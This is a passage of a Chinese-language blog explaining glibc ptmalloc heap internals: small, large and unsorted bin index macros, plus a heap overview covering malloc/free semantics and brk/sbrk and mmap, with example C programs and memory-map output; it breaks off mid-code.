-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment">// 是否需要对small bin的下标进行纠正</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="comment">//判断chunk的大小是否在small bin范围内</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)                                                  \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">// 根据chunk的大小得到small bin对应的索引。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz)                                                     \</span></span><br><span class="line">    ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>)                          \</span><br><span class="line">                           : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>)) +                       \</span><br><span class="line">     SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>
-<p>或许，大家会很疑惑，那fastbin与smallbin中的大小会有很大一部分重合啊，那smallbin中<br>对应大小的bin是不是就没有什么作用啊？其实不然，fastbin中的chunk是有可能被放到<br>smallbin中去的，我们在后面分析具体的源代码时会有深刻体会。</p>
-<h3 id="Largebin"><a href="#Largebin" class="headerlink" title="Largebin"></a>Largebin</h3><p>largebins中一共包括63个bin，每一个bin中的chunk的大小不一致，而是处于一定区间范围<br>内。此外，这63个bin被分成了6组，每组bin中的chunk大小之间的公差一致，具体如下：</p>
-<hr>
-<p>组                     数量                 公差<br>1                        32                   64B<br>2                        16                   512B<br>3                         8                    4096B<br>4                         4                    32768B<br>5                         2                    262144B<br>6                         1                    不限制</p>
-<hr>
-<p>这里我们以32位平台的largebin为例，第一个largebin的起始chunk大小为512个字节，位于<br>第一组，所以该bin可以存储的chunk的大小范围为[512,512+64)</p>
-<p>关于large bin的宏如下，这里我们以32位平台下，第一个largebin的起始chunk大小为例子，<br>为512字节，那么512&gt;&gt;6=8，所以其下标为56+8=64。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                              \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line">    (SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz) : MALLOC_ALIGNMENT == <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure>
-<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin可以视为空闲chunk回归其所属bin之前的缓冲区。<br>其在glibc中具体的说明如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-<p>从下面的宏我们可以看出</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure>
-<p>unsorted bin 处于我们之前所说的bin数组下标1处。故而unsortedbin只有一个链表。<br>unsorted bin中空闲的chunk处于乱序状态，主要有两个来源<br>①当一个较大的chunk被分割成两半后，如果剩下的部分大于MINSIZE，就会被放到unsorted<br>bin中。<br>②释放一个不属于fast bin的chunk，并且该chunk不和top chunk紧邻时，该chunk会被放到<br>unsorted bin中。关于top chunk的解释，请参考下面的介绍。</p>
-<p>此外，Unsorted bin在使用的过程中，采用的遍历顺序是FIFO。</p>
-<h3 id="common-macro"><a href="#common-macro" class="headerlink" title="common macro"></a>common macro</h3><p>这里介绍一些通用的宏。<br>根据chunk的大小统一地获得chunk所在的索引</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define bin_index(sz)                                                          \</span></span><br><span class="line">    ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/14/bin/" data-id="ckpxtnaaq0000xcu64x5b44so" data-title="Bin" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-堆概述" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/" class="article-date">
-  <time class="dt-published" datetime="2021-06-14T14:08:29.000Z" itemprop="datePublished">2021-06-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/">堆概述</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><p>在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实<br>就是程序虚拟空间的一块连续的线性区域，它由低地址向高地址增长。我们一般称管理堆的<br>那部分程序为堆管理器。</p>
-<p>对管理器处于用户程序与内核中间，主要做以下工作</p>
-<p>1.响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了<br>保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器<br>通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统<br>进行交互。</p>
-<p>2.管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由<br>堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存需求。</p>
-<p>Linux中早期的堆分配与回收有Doug Lea实现，但它在并行处理多个线程时，会共享进程的<br>堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁，然而，与此同时，加锁<br>会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，<br>没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger在Doug Lea的基础上<br>进行改进使其可以支持多线程，这个堆分配器就是Ptmalloc。在glibc-2.3.x.之后，glibc中<br>集成了ptmalloc2.</p>
-<p>目前linux标准发行版中使用的堆分配器就是glibc中的堆分配器：ptmalloc2。ptmalloc2主<br>要是通过malloc/free函数来分配和释放内存块。</p>
-<p>需要注意的是，在内存分配和使用的过程中，linux有这样的一个基本内存管理思想，只有当<br>真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。所以虽然操作系统<br>已经给程序分配了很大的一块内存，但是这块内存其实就是虚拟内存。只有当用户使用到<br>相应的内存时，系统才会真正分配物理页面给用户使用。</p>
-<h3 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h3><p>这里我们主要介绍<br>①基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用<br>②接受堆目前的多线程支持</p>
-<h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p>在glibc的malloc.c中，malloc的说明如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>可以看出，malloc函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况<br>进行了处理。<br>①当n=0时，返回当前系统允许的堆的最小内存块。<br>②当n为负数时，由于在大多数系统上，size_t是无符号数，所以程序就会申请很大的内存<br>空间，但通常来说都会失败，因为系统没有那么多内存可以分配。</p>
-<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p>在glibc的malloc.c中，free的说明如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      free(void* p)</span></span><br><span class="line"><span class="comment">      Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">      allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">      effects if p has already been freed.</span></span><br><span class="line"><span class="comment">      Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">      when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">      back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>
-<p>可以看出，free函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到，<br>也有可能是通过相关的函数realloc得到的。</p>
-<p>此外，该函数也同样对异常情况进行了处理<br>①当p为空指针时，函数不进行任何操作<br>②当p已经被释放后，再次释放回出现乱七八糟的效果，这其实就是double free。<br>③除了被禁用mallopt的情况下，当释放很大的内存空间时，程序就会将这些内存空间还给<br>系统，以便于减小程序所使用的内存空间。</p>
-<p>内存分配背后的系统调用</p>
-<p>在前面提到的函数中，无论是malloc函数还是free函数，我们动态申请和释放内存时，都经常<br>会使用，但它们不是真正与系统交互的函数。这些函数背后的系统调用主要是(s)brk函数以及<br>mmap,munmap函数。</p>
-<p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p>
-<p><img src="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/1.png" alt="1.png"></p>
-<p>(s)brk<br>对于堆的操作，操作系统提供了brk函数，glibc库提供了sbrk函数，我们可以通过增加brk的<br>大小来向操作系统申请内存。</p>
-<p>初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。根据是否开启ASLR，<br>两者的具体位置会有所不同。<br>①不开启ASLR保护时，start_brk以及brk会指向data/bss段的结尾。<br>②开启ASLR保护时，start_brk以及brk也会指向同一位置，只是这个位置在data/bss段结尾<br>后的随机偏移处。</p>
-<p>具体效果如下图：</p>
-<p><img src="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/2.png" alt="2.png"></p>
-<p><strong>例子</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是，在每一次执行完操作后，都执行了getchar()函数，这是为了方便我们查看<br>程序真正的映射。</p>
-<p><strong>在第一次调用brk之前</strong></p>
-<p>从下面的输出可以看出，并没有出现堆。因此<br>①start_brk=brk=end_data=0x804b000</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-<p><strong>第一次增加brk后</strong><br>从下面的输出可以看出，已经出现了堆段<br>①start_brk=end_data=0x804b000<br>②brk=0x804c000</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">Program Break Location2:0x804c000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">0804b000-0804c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-<p>其中，关于堆的那一行<br>①0x0804b000是响应堆的起始地址<br>②rw-p表明堆具有可读可写权限，并且属于隐私数据。<br>③00000000表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为0。<br>④00:00是主从的设备号，这部分内容也不是从文件中映射得到的，所以也都为0。<br>⑤0表示Inode号。由于这部分内容并不是从文件中映射得到的，所以为0。</p>
-<p><strong>mmap</strong><br>malloc会使用mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的<br>内存，并且这块内存仅仅被进程所使用。</p>
-<p><strong>例子</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span 